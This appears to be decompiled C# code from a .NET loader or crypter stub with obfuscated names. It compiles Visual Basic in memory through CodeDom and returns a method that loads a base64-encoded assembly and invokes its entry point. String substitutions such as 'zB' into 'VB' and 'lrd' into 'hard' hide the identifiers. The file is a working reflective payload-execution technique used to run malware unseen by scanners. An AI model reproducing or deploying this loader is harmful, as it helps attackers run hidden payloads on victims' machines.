using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class0
{
	public static object smethod_0()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		CompilerParameters val = new CompilerParameters();
		new ArrayList();
		Thread.Sleep(1);
		CodeDomProvider val2 = CodeDomProvider.CreateProvider("zB".Replace("z", "V"));
		val.set_GenerateInMemory(true);
		val.set_CompilerOptions("/optimize+ /platform:x86 /target:library");
		val.get_ReferencedAssemblies().AddRange(new string[6] { "System.dll", "System.Data.dll", "System.Deployment.dll", "System.Drawing.dll", "System.Windows.Forms.dll", "System.Xml.dll" });
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append("\r\nImports System, Microsoft.VisualBasic, System.Reflection");
		stringBuilder.Append("\r\nModule Yo");
		stringBuilder.Append("\r\nSub Main()");
		stringBuilder.Append("\r\nEnd Sub");
		stringBuilder.Append("\r\nPublic function hard(byval s as Object) As Byte");
		stringBuilder.Append("\r\nreturn Assembly.Load(convert.frombase64string(s)).Entrypoint.Invoke(nothing,nothing)");
		stringBuilder.Append("\r\nend function");
		stringBuilder.Append("\r\nEnd module");
		CompilerResults val3 = val2.CompileAssemblyFromSource(val, new string[1] { stringBuilder.ToString() });
		Type type = val3.get_CompiledAssembly().GetType("èo".Replace("è", "Y"));
		return type.GetMethod("lrd".Replace("l", "ha"));
	}
}
